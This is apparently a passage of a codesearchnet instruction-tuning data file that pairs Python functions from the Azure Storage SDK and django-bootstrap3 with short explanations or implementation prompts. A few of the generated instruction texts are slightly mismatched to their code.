{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn a boolean indicating whether the resource exists in the given share.", "response": "def exists(self, share_name, directory_name=None, file_name=None, timeout=None, snapshot=None):\n        '''\n        Returns a boolean indicating whether the share exists if only share name is\n        given. If directory_name is specificed a boolean will be returned indicating\n        if the directory exists. If file_name is specified as well, a boolean will be\n        returned indicating if the file exists.\n\n        :param str share_name:\n            Name of a share.\n        :param str directory_name:\n            The path to a directory.\n        :param str file_name:\n            Name of a file.\n        :param int timeout:\n            The timeout parameter is expressed in seconds.\n        :param str snapshot:\n            A string that represents the snapshot version, if applicable.\n        :return: A boolean indicating whether the resource exists.\n        :rtype: bool\n        '''\n        _validate_not_none('share_name', share_name)\n        try:\n            request = HTTPRequest()\n            request.method = 'HEAD' if file_name is not None else 'GET'\n            request.host_locations = self._get_host_locations()\n            request.path = _get_path(share_name, directory_name, file_name)\n\n            if file_name is not None:\n                restype = None\n                expected_errors = [_RESOURCE_NOT_FOUND_ERROR_CODE, _PARENT_NOT_FOUND_ERROR_CODE]\n            elif directory_name is not None:\n                restype = 'directory'\n                expected_errors = [_RESOURCE_NOT_FOUND_ERROR_CODE, _SHARE_NOT_FOUND_ERROR_CODE,\n                                   _PARENT_NOT_FOUND_ERROR_CODE]\n            else:\n                restype = 'share'\n                expected_errors = [_SHARE_NOT_FOUND_ERROR_CODE]\n\n            request.query = {\n                'restype': restype,\n                'timeout': _int_to_str(timeout),\n                'sharesnapshot': _to_str(snapshot)\n            }\n            self._perform_request(request, expected_errors=expected_errors)\n            return True\n        except AzureHttpError as ex:\n            _dont_fail_not_exist(ex)\n            return False"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef copy_file(self, share_name, directory_name, file_name, copy_source,\n                  metadata=None, timeout=None):\n        '''\n        Copies a file asynchronously. This operation returns a copy operation \n        properties object, including a copy ID you can use to check or abort the \n        copy operation. The File service copies files on a best-effort basis.\n\n        If the destination file exists, it will be overwritten. The destination \n        file cannot be modified while the copy operation is in progress.\n\n        :param str share_name:\n            Name of the destination share. The share must exist.\n        :param str directory_name:\n            Name of the destination directory. The directory must exist.\n        :param str file_name:\n            Name of the destination file. If the destination file exists, it will \n            be overwritten. Otherwise, it will be created.\n        :param str copy_source:\n            A URL of up to 2 KB in length that specifies an Azure file or blob. \n            The value should be URL-encoded as it would appear in a request URI. \n            If the source is in another account, the source must either be public \n            or must be authenticated via a shared access signature. If the source \n            is public, no authentication is required.\n            Examples:\n            https://myaccount.file.core.windows.net/myshare/mydir/myfile\n            https://otheraccount.file.core.windows.net/myshare/mydir/myfile?sastoken\n        :param metadata:\n            Name-value pairs associated with the file as metadata. If no name-value \n            pairs are specified, the operation will copy the metadata from the \n            source blob or file to the destination file. If one or more name-value \n            pairs are specified, the destination file is created with the specified \n            metadata, and the metadata is not copied from the source blob or file. \n        :type metadata: dict(str, str).\n        :param int timeout:\n            The timeout parameter is expressed in seconds.\n        :return: Copy operation properties such as status, source, and ID.\n        :rtype: :class:`~azure.storage.file.models.CopyProperties`\n        '''\n        _validate_not_none('share_name', share_name)\n        _validate_not_none('file_name', file_name)\n        _validate_not_none('copy_source', copy_source)\n\n        request = HTTPRequest()\n        request.method = 'PUT'\n        request.host_locations = self._get_host_locations()\n        request.path = _get_path(share_name, directory_name, file_name)\n        request.query = {'timeout': _int_to_str(timeout)}\n        request.headers = {\n            'x-ms-copy-source': _to_str(copy_source),\n        }\n        _add_metadata_headers(metadata, request)\n\n        return self._perform_request(request, _parse_properties, [FileProperties]).copy", "response": "Copy a file asynchronously."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef abort_copy_file(self, share_name, directory_name, file_name, copy_id, timeout=None):\n        '''\n         Aborts a pending copy_file operation, and leaves a destination file\n         with zero length and full metadata.\n\n        :param str share_name:\n             Name of destination share.\n        :param str directory_name:\n            The path to the directory.\n        :param str file_name:\n             Name of destination file.\n        :param str copy_id:\n            Copy identifier provided in the copy.id of the original\n            copy_file operation.\n        :param int timeout:\n            The timeout parameter is expressed in seconds.\n        '''\n        _validate_not_none('share_name', share_name)\n        _validate_not_none('file_name', file_name)\n        _validate_not_none('copy_id', copy_id)\n        request = HTTPRequest()\n        request.method = 'PUT'\n        request.host_locations = self._get_host_locations()\n        request.path = _get_path(share_name, directory_name, file_name)\n        request.query = {\n            'comp': 'copy',\n            'copyid': _to_str(copy_id),\n            'timeout': _int_to_str(timeout),\n        }\n        request.headers = {\n            'x-ms-copy-action': 'abort',\n        }\n\n        self._perform_request(request)", "response": "Aborts a pending copy_file operation and leaves a destination file\n         with zero length and full metadata."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef create_file(self, share_name, directory_name, file_name,\n                    content_length, content_settings=None, metadata=None,\n                    timeout=None):\n        '''\n        Creates a new file.\n\n        See create_file_from_* for high level functions that handle the\n        creation and upload of large files with automatic chunking and\n        progress notifications.\n\n        :param str share_name:\n            Name of existing share.\n        :param str directory_name:\n            The path to the directory.\n        :param str file_name:\n            Name of file to create or update.\n        :param int content_length:\n            Length of the file in bytes.\n        :param ~azure.storage.file.models.ContentSettings content_settings:\n            ContentSettings object used to set file properties.\n        :param metadata:\n            Name-value pairs associated with the file as metadata.\n        :type metadata: dict(str, str)\n        :param int timeout:\n            The timeout parameter is expressed in seconds.\n        '''\n        _validate_not_none('share_name', share_name)\n        _validate_not_none('file_name', file_name)\n        _validate_not_none('content_length', content_length)\n        request = HTTPRequest()\n        request.method = 'PUT'\n        request.host_locations = self._get_host_locations()\n        request.path = _get_path(share_name, directory_name, file_name)\n        request.query = {'timeout': _int_to_str(timeout)}\n        request.headers = {\n            'x-ms-content-length': _to_str(content_length),\n            'x-ms-type': 'file'\n        }\n        _add_metadata_headers(metadata, request)\n        if content_settings is not None:\n            request.headers.update(content_settings._to_headers())\n\n        self._perform_request(request)", "response": "Creates a new file in the specified share."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef create_file_from_path(self, share_name, directory_name, file_name,\n                              local_file_path, content_settings=None,\n                              metadata=None, validate_content=False, progress_callback=None,\n                              max_connections=2, timeout=None):\n        '''\n        Creates a new azure file from a local file path, or updates the content of an\n        existing file, with automatic chunking and progress notifications.\n\n        :param str share_name:\n            Name of existing share.\n        :param str directory_name:\n            The path to the directory.\n        :param str file_name:\n            Name of file to create or update.\n        :param str local_file_path:\n            Path of the local file to upload as the file content.\n        :param ~azure.storage.file.models.ContentSettings content_settings:\n            ContentSettings object used for setting file properties.\n        :param metadata:\n            Name-value pairs associated with the file as metadata.\n        :type metadata: dict(str, str)\n        :param bool validate_content:\n            If true, calculates an MD5 hash for each range of the file. The storage \n            service checks the hash of the content that has arrived with the hash \n            that was sent. This is primarily valuable for detecting bitflips on \n            the wire if using http instead of https as https (the default) will \n            already validate. Note that this MD5 hash is not stored with the \n            file.\n        :param progress_callback:\n            Callback for progress with signature function(current, total) where\n            current is the number of bytes transfered so far and total is the\n            size of the file, or None if the total size is unknown.\n        :type progress_callback: func(current, total)\n        :param int max_connections:\n            Maximum number of parallel connections to use.\n        :param int timeout:\n            The timeout parameter is expressed in seconds. This method may make \n            multiple calls to the Azure service and the timeout will apply to \n            each call individually.\n        '''\n        _validate_not_none('share_name', share_name)\n        _validate_not_none('file_name', file_name)\n        _validate_not_none('local_file_path', local_file_path)\n\n        count = path.getsize(local_file_path)\n        with open(local_file_path, 'rb') as stream:\n            self.create_file_from_stream(\n                share_name, directory_name, file_name, stream,\n                count, content_settings, metadata, validate_content, progress_callback,\n                max_connections, timeout)", "response": "Creates a new file from a local file path."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nupdates the content of the specified file in the specified range.", "response": "def update_range(self, share_name, directory_name, file_name, data,\n                     start_range, end_range, validate_content=False, timeout=None):\n        '''\n        Writes the bytes specified by the request body into the specified range.\n         \n        :param str share_name:\n            Name of existing share.\n        :param str directory_name:\n            The path to the directory.\n        :param str file_name:\n            Name of existing file.\n        :param bytes data:\n            Content of the range.\n        :param int start_range:\n            Start of byte range to use for updating a section of the file.\n            The range can be up to 4 MB in size.\n            The start_range and end_range params are inclusive.\n            Ex: start_range=0, end_range=511 will download first 512 bytes of file.\n        :param int end_range:\n            End of byte range to use for updating a section of the file.\n            The range can be up to 4 MB in size.\n            The start_range and end_range params are inclusive.\n            Ex: start_range=0, end_range=511 will download first 512 bytes of file.\n        :param bool validate_content:\n            If true, calculates an MD5 hash of the page content. The storage \n            service checks the hash of the content that has arrived\n            with the hash that was sent. This is primarily valuable for detecting \n            bitflips on the wire if using http instead of https as https (the default) \n            will already validate. Note that this MD5 hash is not stored with the \n            file.\n        :param int timeout:\n            The timeout parameter is expressed in seconds.\n        '''\n        _validate_not_none('share_name', share_name)\n        _validate_not_none('file_name', file_name)\n        _validate_not_none('data', data)\n        request = HTTPRequest()\n        request.method = 'PUT'\n        request.host_locations = self._get_host_locations()\n        request.path = _get_path(share_name, directory_name, file_name)\n        request.query = {\n            'comp': 'range',\n            'timeout': _int_to_str(timeout),\n        }\n        request.headers = {\n            'x-ms-write': 'update',\n        }\n        _validate_and_format_range_headers(\n            request, start_range, end_range)\n        request.body = _get_data_bytes_only('data', data)\n\n        if validate_content:\n            computed_md5 = _get_content_md5(request.body)\n            request.headers['Content-MD5'] = _to_str(computed_md5)\n\n        self._perform_request(request)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef set_proxy(self, host, port, user, password):\n        '''\n        Sets the proxy server host and port for the HTTP CONNECT Tunnelling.\n\n        Note that we set the proxies directly on the request later on rather than\n        using the session object as requests has a bug where session proxy is ignored\n        in favor of environment proxy. So, auth will not work unless it is passed\n        directly when making the request as this overrides both.\n\n        :param str host:\n            Address of the proxy. Ex: '192.168.0.100'\n        :param int port:\n            Port of the proxy. Ex: 6000\n        :param str user:\n            User for proxy authorization.\n        :param str password:\n            Password for proxy authorization.\n        '''\n        if user and password:\n            proxy_string = '{}:{}@{}:{}'.format(user, password, host, port)\n        else:\n            proxy_string = '{}:{}'.format(host, port)\n\n        self.proxies = {'http': 'http://{}'.format(proxy_string),\n                        'https': 'https://{}'.format(proxy_string)}", "response": "Sets the proxies for the HTTP CONNECT Tunnelling."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nsends an HTTP request to Azure Storage and returns an HTTPResponse. If the response code is an error raise HTTPError. Otherwise raise HTTPError.", "response": "def perform_request(self, request):\n        '''\n        Sends an HTTPRequest to Azure Storage and returns an HTTPResponse. If \n        the response code indicates an error, raise an HTTPError.    \n        \n        :param HTTPRequest request:\n            The request to serialize and send.\n        :return: An HTTPResponse containing the parsed HTTP response.\n        :rtype: :class:`~azure.storage.common._http.HTTPResponse`\n        '''\n        # Verify the body is in bytes or either a file-like/stream object\n        if request.body:\n            request.body = _get_data_bytes_or_stream_only('request.body', request.body)\n\n        # Construct the URI\n        uri = self.protocol.lower() + '://' + request.host + request.path\n\n        # Send the request\n        response = self.session.request(request.method,\n                                        uri,\n                                        params=request.query,\n                                        headers=request.headers,\n                                        data=request.body or None,\n                                        timeout=self.timeout,\n                                        proxies=self.proxies)\n\n        # Parse the response\n        status = int(response.status_code)\n        response_headers = {}\n        for key, name in response.headers.items():\n            # Preserve the case of metadata\n            if key.lower().startswith('x-ms-meta-'):\n                response_headers[key] = name\n            else:\n                response_headers[key.lower()] = name\n\n        wrap = HTTPResponse(status, response.reason, response_headers, response.content)\n        response.close()\n\n        return wrap"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns a boolean indicating whether or not the retry should be performed.", "response": "def _should_retry(self, context):\n        '''\n        A function which determines whether or not to retry.\n\n        :param ~azure.storage.models.RetryContext context: \n            The retry context. This contains the request, response, and other data \n            which can be used to determine whether or not to retry.\n        :return: \n            A boolean indicating whether or not to retry the request.\n        :rtype: bool\n        '''\n        # If max attempts are reached, do not retry.\n        if context.count >= self.max_attempts:\n            return False\n\n        status = None\n        if context.response and context.response.status:\n            status = context.response.status\n\n        if status is None:\n            '''\n            If status is None, retry as this request triggered an exception. For \n            example, network issues would trigger this.\n            '''\n            return True\n        elif 200 <= status < 300:\n            '''\n            This method is called after a successful response, meaning we failed \n            during the response body download or parsing. So, success codes should \n            be retried.\n            '''\n            return True\n        elif 300 <= status < 500:\n            '''\n            An exception occured, but in most cases it was expected. Examples could \n            include a 309 Conflict or 412 Precondition Failed.\n            '''\n            if status == 404 and context.location_mode == LocationMode.SECONDARY:\n                # Response code 404 should be retried if secondary was used.\n                return True\n            if status == 408:\n                # Response code 408 is a timeout and should be retried.\n                return True\n            return False\n        elif status >= 500:\n            '''\n            Response codes above 500 with the exception of 501 Not Implemented and \n            505 Version Not Supported indicate a server issue and should be retried.\n            '''\n            if status == 501 or status == 505:\n                return False\n            return True\n        else:\n            # If something else happened, it's unexpected. Retry.\n            return True"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _get_path(queue_name=None, include_messages=None, message_id=None):\n    '''\n    Creates the path to access a queue resource.\n\n    queue_name:\n        Name of queue.\n    include_messages:\n        Whether or not to include messages.\n    message_id:\n        Message id.\n    '''\n    if queue_name and include_messages and message_id:\n        return '/{0}/messages/{1}'.format(_str(queue_name), message_id)\n    if queue_name and include_messages:\n        return '/{0}/messages'.format(_str(queue_name))\n    elif queue_name:\n        return '/{0}'.format(_str(queue_name))\n    else:\n        return '/'", "response": "Returns the path to access a queue resource."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _convert_queue_message_xml(message_text, encode_function, key_encryption_key):\n    '''\n    <?xml version=\"1.0\" encoding=\"utf-8\"?>\n    <QueueMessage>\n        <MessageText></MessageText>\n    </QueueMessage>\n    '''\n    queue_message_element = ETree.Element('QueueMessage')\n\n    # Enabled\n    message_text = encode_function(message_text)\n    if key_encryption_key is not None:\n        message_text = _encrypt_queue_message(message_text, key_encryption_key)\n    ETree.SubElement(queue_message_element, 'MessageText').text = message_text\n\n    # Add xml declaration and serialize\n    try:\n        stream = BytesIO()\n        ETree.ElementTree(queue_message_element).write(stream, xml_declaration=True, encoding='utf-8', method='xml')\n        output = stream.getvalue()\n    finally:\n        stream.close()\n\n    return output", "response": "Convert a string containing a queue message into XML."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nextract out resource metadata information.", "response": "def _parse_metadata(response):\n    '''\n    Extracts out resource metadata information.\n    '''\n\n    if response is None or response.headers is None:\n        return None\n\n    metadata = _dict()\n    for key, value in response.headers.items():\n        if key.lower().startswith('x-ms-meta-'):\n            metadata[key[10:]] = _to_str(value)\n\n    return metadata"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nextract out resource properties and metadata information.", "response": "def _parse_properties(response, result_class):\n    '''\n    Extracts out resource properties and metadata information.\n    Ignores the standard http headers.\n    '''\n\n    if response is None or response.headers is None:\n        return None\n\n    props = result_class()\n    for key, value in response.headers.items():\n        info = GET_PROPERTIES_ATTRIBUTE_MAP.get(key)\n        if info:\n            if info[0] is None:\n                setattr(props, info[1], info[2](value))\n            else:\n                attr = getattr(props, info[0])\n                setattr(attr, info[1], info[2](value))\n\n    if hasattr(props, 'blob_type') and props.blob_type == 'PageBlob' and hasattr(props, 'blob_tier') and props.blob_tier is not None:\n        props.blob_tier = _to_upper_str(props.blob_tier)\n    return props"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nconverts the XML response to service properties.", "response": "def _convert_xml_to_service_properties(response):\n    '''\n    <?xml version=\"1.0\" encoding=\"utf-8\"?>\n    <StorageServiceProperties>\n        <Logging>\n            <Version>version-number</Version>\n            <Delete>true|false</Delete>\n            <Read>true|false</Read>\n            <Write>true|false</Write>\n            <RetentionPolicy>\n                <Enabled>true|false</Enabled>\n                <Days>number-of-days</Days>\n            </RetentionPolicy>\n        </Logging>\n        <HourMetrics>\n            <Version>version-number</Version>\n            <Enabled>true|false</Enabled>\n            <IncludeAPIs>true|false</IncludeAPIs>\n            <RetentionPolicy>\n                <Enabled>true|false</Enabled>\n                <Days>number-of-days</Days>\n            </RetentionPolicy>\n        </HourMetrics>\n        <MinuteMetrics>\n            <Version>version-number</Version>\n            <Enabled>true|false</Enabled>\n            <IncludeAPIs>true|false</IncludeAPIs>\n            <RetentionPolicy>\n                <Enabled>true|false</Enabled>\n                <Days>number-of-days</Days>\n            </RetentionPolicy>\n        </MinuteMetrics>\n        <Cors>\n            <CorsRule>\n                <AllowedOrigins>comma-separated-list-of-allowed-origins</AllowedOrigins>\n                <AllowedMethods>comma-separated-list-of-HTTP-verb</AllowedMethods>\n                <MaxAgeInSeconds>max-caching-age-in-seconds</MaxAgeInSeconds>\n                <ExposedHeaders>comma-seperated-list-of-response-headers</ExposedHeaders>\n                <AllowedHeaders>comma-seperated-list-of-request-headers</AllowedHeaders>\n            </CorsRule>\n        </Cors>\n        <DeleteRetentionPolicy>\n             <Enabled>true|false</Enabled>\n             <Days>number-of-days</Days>\n        </DeleteRetentionPolicy>\n        <StaticWebsite>\n            <Enabled>true|false</Enabled>\n            <IndexDocument></IndexDocument>\n            <ErrorDocument404Path></ErrorDocument404Path>\n        </StaticWebsite>\n    </StorageServiceProperties>\n    '''\n    if response is None or response.body is None:\n        return None\n\n    service_properties_element = ETree.fromstring(response.body)\n    service_properties = ServiceProperties()\n\n    # Logging\n    logging = service_properties_element.find('Logging')\n    if logging is not None:\n        service_properties.logging = Logging()\n        service_properties.logging.version = logging.find('Version').text\n        service_properties.logging.delete = _bool(logging.find('Delete').text)\n        service_properties.logging.read = _bool(logging.find('Read').text)\n        service_properties.logging.write = _bool(logging.find('Write').text)\n\n        _convert_xml_to_retention_policy(logging.find('RetentionPolicy'),\n                                         service_properties.logging.retention_policy)\n    # HourMetrics\n    hour_metrics_element = service_properties_element.find('HourMetrics')\n    if hour_metrics_element is not None:\n        service_properties.hour_metrics = Metrics()\n        _convert_xml_to_metrics(hour_metrics_element, service_properties.hour_metrics)\n\n    # MinuteMetrics\n    minute_metrics_element = service_properties_element.find('MinuteMetrics')\n    if minute_metrics_element is not None:\n        service_properties.minute_metrics = Metrics()\n        _convert_xml_to_metrics(minute_metrics_element, service_properties.minute_metrics)\n\n    # CORS\n    cors = service_properties_element.find('Cors')\n    if cors is not None:\n        service_properties.cors = list()\n        for rule in cors.findall('CorsRule'):\n            allowed_origins = rule.find('AllowedOrigins').text.split(',')\n\n            allowed_methods = rule.find('AllowedMethods').text.split(',')\n\n            max_age_in_seconds = int(rule.find('MaxAgeInSeconds').text)\n\n            cors_rule = CorsRule(allowed_origins, allowed_methods, max_age_in_seconds)\n\n            exposed_headers = rule.find('ExposedHeaders').text\n            if exposed_headers is not None:\n                cors_rule.exposed_headers = exposed_headers.split(',')\n\n            allowed_headers = rule.find('AllowedHeaders').text\n            if allowed_headers is not None:\n                cors_rule.allowed_headers = allowed_headers.split(',')\n\n            service_properties.cors.append(cors_rule)\n\n    # Target version\n    target_version = service_properties_element.find('DefaultServiceVersion')\n    if target_version is not None:\n        service_properties.target_version = target_version.text\n\n    # DeleteRetentionPolicy\n    delete_retention_policy_element = service_properties_element.find('DeleteRetentionPolicy')\n    if delete_retention_policy_element is not None:\n        service_properties.delete_retention_policy = DeleteRetentionPolicy()\n        policy_enabled = _bool(delete_retention_policy_element.find('Enabled').text)\n        service_properties.delete_retention_policy.enabled = policy_enabled\n\n        if policy_enabled:\n            service_properties.delete_retention_policy.days = int(delete_retention_policy_element.find('Days').text)\n\n    # StaticWebsite\n    static_website_element = service_properties_element.find('StaticWebsite')\n    if static_website_element is not None:\n        service_properties.static_website = StaticWebsite()\n        service_properties.static_website.enabled = _bool(static_website_element.find('Enabled').text)\n\n        index_document_element = static_website_element.find('IndexDocument')\n        if index_document_element is not None:\n            service_properties.static_website.index_document = index_document_element.text\n\n        error_document_element = static_website_element.find('ErrorDocument404Path')\n        if error_document_element is not None:\n            service_properties.static_website.error_document_404_path = error_document_element.text\n\n    return service_properties"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _convert_xml_to_metrics(xml, metrics):\n    '''\n    <Version>version-number</Version>\n    <Enabled>true|false</Enabled>\n    <IncludeAPIs>true|false</IncludeAPIs>\n    <RetentionPolicy>\n        <Enabled>true|false</Enabled>\n        <Days>number-of-days</Days>\n    </RetentionPolicy>\n    '''\n    # Version\n    metrics.version = xml.find('Version').text\n\n    # Enabled\n    metrics.enabled = _bool(xml.find('Enabled').text)\n\n    # IncludeAPIs\n    include_apis_element = xml.find('IncludeAPIs')\n    if include_apis_element is not None:\n        metrics.include_apis = _bool(include_apis_element.text)\n\n    # RetentionPolicy\n    _convert_xml_to_retention_policy(xml.find('RetentionPolicy'), metrics.retention_policy)", "response": "Convert XML to Metrics object."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nconverting XML to retention policy.", "response": "def _convert_xml_to_retention_policy(xml, retention_policy):\n    '''\n    <Enabled>true|false</Enabled>\n    <Days>number-of-days</Days>\n    '''\n    # Enabled\n    retention_policy.enabled = _bool(xml.find('Enabled').text)\n\n    # Days\n    days_element = xml.find('Days')\n    if days_element is not None:\n        retention_policy.days = int(days_element.text)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ngenerate a shared access signature for the specified queue.", "response": "def generate_queue(self, queue_name, permission=None,\n                       expiry=None, start=None, id=None,\n                       ip=None, protocol=None):\n        '''\n        Generates a shared access signature for the queue.\n        Use the returned signature with the sas_token parameter of QueueService.\n\n        :param str queue_name:\n            Name of queue.\n        :param QueuePermissions permission:\n            The permissions associated with the shared access signature. The\n            user is restricted to operations allowed by the permissions.\n            Permissions must be ordered read, add, update, process.\n            Required unless an id is given referencing a stored access policy\n            which contains this field. This field must be omitted if it has been\n            specified in an associated stored access policy.\n        :param expiry:\n            The time at which the shared access signature becomes invalid.\n            Required unless an id is given referencing a stored access policy\n            which contains this field. This field must be omitted if it has\n            been specified in an associated stored access policy. Azure will always\n            convert values to UTC. If a date is passed in without timezone info, it\n            is assumed to be UTC.\n        :type expiry: datetime or str\n        :param start:\n            The time at which the shared access signature becomes valid. If\n            omitted, start time for this call is assumed to be the time when the\n            storage service receives the request. Azure will always convert values\n            to UTC. If a date is passed in without timezone info, it is assumed to\n            be UTC.\n        :type start: datetime or str\n        :param str id:\n            A unique value up to 64 characters in length that correlates to a\n            stored access policy. To create a stored access policy, use\n            set_blob_service_properties.\n        :param str ip:\n            Specifies an IP address or a range of IP addresses from which to accept requests.\n            If the IP address from which the request originates does not match the IP address\n            or address range specified on the SAS token, the request is not authenticated.\n            For example, specifying sip=168.1.5.65 or sip=168.1.5.60-168.1.5.70 on the SAS\n            restricts the request to those IP addresses.\n        :param str protocol:\n            Specifies the protocol permitted for a request made. The default value\n            is https,http. See :class:`~azure.storage.common.models.Protocol` for possible values.\n        '''\n        sas = _SharedAccessHelper()\n        sas.add_base(permission, expiry, start, ip, protocol, self.x_ms_version)\n        sas.add_id(id)\n        sas.add_resource_signature(self.account_name, self.account_key, 'queue', queue_name)\n\n        return sas.get_token()"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nrenders a Bootstrap glyphicon icon", "response": "def render_icon(icon, **kwargs):\n    \"\"\"\n    Render a Bootstrap glyphicon icon\n    \"\"\"\n    attrs = {\n        \"class\": add_css_class(\n            \"glyphicon glyphicon-{icon}\".format(icon=icon),\n            kwargs.get(\"extra_classes\", \"\"),\n        )\n    }\n    title = kwargs.get(\"title\")\n    if title:\n        attrs[\"title\"] = title\n    return render_tag(\"span\", attrs=attrs)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef render_alert(content, alert_type=None, dismissable=True):\n    button = \"\"\n    if not alert_type:\n        alert_type = \"info\"\n    css_classes = [\"alert\", \"alert-\" + text_value(alert_type)]\n    if dismissable:\n        css_classes.append(\"alert-dismissable\")\n        button = (\n            '<button type=\"button\" class=\"close\" '\n            + 'data-dismiss=\"alert\" aria-hidden=\"true\">&times;</button>'\n        )\n    button_placeholder = \"__BUTTON__\"\n    return mark_safe(\n        render_tag(\n            \"div\",\n            attrs={\"class\": \" \".join(css_classes)},\n            content=button_placeholder + text_value(content),\n        ).replace(button_placeholder, button)\n    )", "response": "Render a Bootstrap alert"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef text_concat(*args, **kwargs):\n    separator = text_value(kwargs.get(\"separator\", \"\"))\n    values = filter(None, [text_value(v) for v in args])\n    return separator.join(values)", "response": "Concatenate several values as a text string with an optional separator"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef bootstrap_message_classes(message):\n    extra_tags = None\n    try:\n        extra_tags = message.extra_tags\n    except AttributeError:\n        pass\n    if not extra_tags:\n        extra_tags = \"\"\n    classes = [extra_tags]\n    try:\n        level = message.level\n    except AttributeError:\n        pass\n    else:\n        try:\n            classes.append(MESSAGE_LEVEL_CLASSES[level])\n        except KeyError:\n            classes.append(\"alert alert-danger\")\n    return \" \".join(classes).strip()", "response": "Return the message classes for a message"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef bootstrap_css():\n    rendered_urls = [render_link_tag(bootstrap_css_url())]\n    if bootstrap_theme_url():\n        rendered_urls.append(render_link_tag(bootstrap_theme_url()))\n    return mark_safe(\"\".join([url for url in rendered_urls]))", "response": "Returns HTML for Bootstrap CSS."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns HTML for Bootstrap JavaScript.", "response": "def bootstrap_javascript(jquery=None):\n    \"\"\"\n    Return HTML for Bootstrap JavaScript.\n\n    Adjust url in settings. If no url is returned, we don't want this\n    statement to return any HTML.\n    This is intended behavior.\n\n    Default value: ``None``\n\n    This value is configurable, see Settings section\n\n    **Tag name**::\n\n        bootstrap_javascript\n\n    **Parameters**:\n\n        :jquery: Truthy to include jQuery as well as Bootstrap\n\n    **Usage**::\n\n        {% bootstrap_javascript %}\n\n    **Example**::\n\n        {% bootstrap_javascript jquery=1 %}\n    \"\"\"\n\n    javascript = \"\"\n    # See if we have to include jQuery\n    if jquery is None:\n        jquery = get_bootstrap_setting(\"include_jquery\", False)\n    # NOTE: No async on scripts, not mature enough. See issue #52 and #56\n    if jquery:\n        url = bootstrap_jquery_url()\n        if url:\n            javascript += render_script_tag(url)\n    url = bootstrap_javascript_url()\n    if url:\n        javascript += render_script_tag(url)\n    return mark_safe(javascript)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nrendering buttons for the Taxonomy", "response": "def bootstrap_buttons(parser, token):\n    \"\"\"\n    Render buttons for form\n\n    **Tag name**::\n\n        buttons\n\n    **Parameters**:\n\n        submit\n            Text for a submit button\n\n        reset\n            Text for a reset button\n\n    **Usage**::\n\n        {% buttons %}{% endbuttons %}\n\n    **Example**::\n\n        {% buttons submit='OK' reset=\"Cancel\" %}{% endbuttons %}\n\n    \"\"\"\n    kwargs = parse_token_contents(parser, token)\n    kwargs[\"nodelist\"] = parser.parse((\"endbuttons\",))\n    parser.delete_first_token()\n    return ButtonsNode(**kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef bootstrap_messages(context, *args, **kwargs):\n\n    # Force Django 1.8+ style, so dicts and not Context\n    # TODO: This may be due to a bug in Django 1.8/1.9+\n    if Context and isinstance(context, Context):\n        context = context.flatten()\n    context.update({\"message_constants\": message_constants})\n    return render_template_file(\"bootstrap3/messages.html\", context=context)", "response": "A Bootstrap alert container."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ngenerate Bootstrap pagination context from a page object.", "response": "def get_pagination_context(\n    page, pages_to_show=11, url=None, size=None, extra=None, parameter_name=\"page\"\n):\n    \"\"\"\n    Generate Bootstrap pagination context from a page object\n    \"\"\"\n    pages_to_show = int(pages_to_show)\n    if pages_to_show < 1:\n        raise ValueError(\n            \"Pagination pages_to_show should be a positive integer, you specified {pages}\".format(\n                pages=pages_to_show\n            )\n        )\n    num_pages = page.paginator.num_pages\n    current_page = page.number\n    half_page_num = int(floor(pages_to_show / 2))\n    if half_page_num < 0:\n        half_page_num = 0\n    first_page = current_page - half_page_num\n    if first_page <= 1:\n        first_page = 1\n    if first_page > 1:\n        pages_back = first_page - half_page_num\n        if pages_back < 1:\n            pages_back = 1\n    else:\n        pages_back = None\n    last_page = first_page + pages_to_show - 1\n    if pages_back is None:\n        last_page += 1\n    if last_page > num_pages:\n        last_page = num_pages\n    if last_page < num_pages:\n        pages_forward = last_page + half_page_num\n        if pages_forward > num_pages:\n            pages_forward = num_pages\n    else:\n        pages_forward = None\n        if first_page > 1:\n            first_page -= 1\n        if pages_back is not None and pages_back > 1:\n            pages_back -= 1\n        else:\n            pages_back = None\n    pages_shown = []\n    for i in range(first_page, last_page + 1):\n        pages_shown.append(i)\n        # Append proper character to url\n    if url:\n        # Remove existing page GET parameters\n        url = force_text(url)\n        url = re.sub(r\"\\?{0}\\=[^\\&]+\".format(parameter_name), \"?\", url)\n        url = re.sub(r\"\\&{0}\\=[^\\&]+\".format(parameter_name), \"\", url)\n        # Append proper separator\n        if \"?\" in url:\n            url += \"&\"\n        else:\n            url += \"?\"\n            # Append extra string to url\n    if extra:\n        if not url:\n            url = \"?\"\n        url += force_text(extra) + \"&\"\n    if url:\n        url = url.replace(\"?&\", \"?\")\n    # Set CSS classes, see http://getbootstrap.com/components/#pagination\n    pagination_css_classes = [\"pagination\"]\n    if size 